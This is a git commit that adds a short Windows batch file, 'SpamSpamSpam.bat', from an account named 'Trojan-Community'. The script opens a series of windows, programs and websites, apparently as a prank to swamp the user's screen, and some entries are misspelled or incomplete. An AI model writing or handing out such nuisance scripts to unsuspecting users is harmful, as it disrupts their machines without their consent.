3bff6520c031568a5281b458f996c92a6df92891
Trojan-Community <93414769+TrojanHorse-Communtiy@users.noreply.github.com>
2022-05-05 12:23:41 +1000

    Create SpamSpamSpam.bat

---
+++ SpamSpamSpam.bat
@@ -0,0 +1,19 @@
+@echo off
+cls
+goto main
+
+:main
+cls
+start WinWarn
+start WinWarn2
+start UNDELETABLE
+start echo
+start google
+start www.google.com
+start www.gmail.com
+start www.yahoo.com
+start www.youtube.com
+start www.wikipedia.com
+start Edge
+start Microsft Edge
+start 
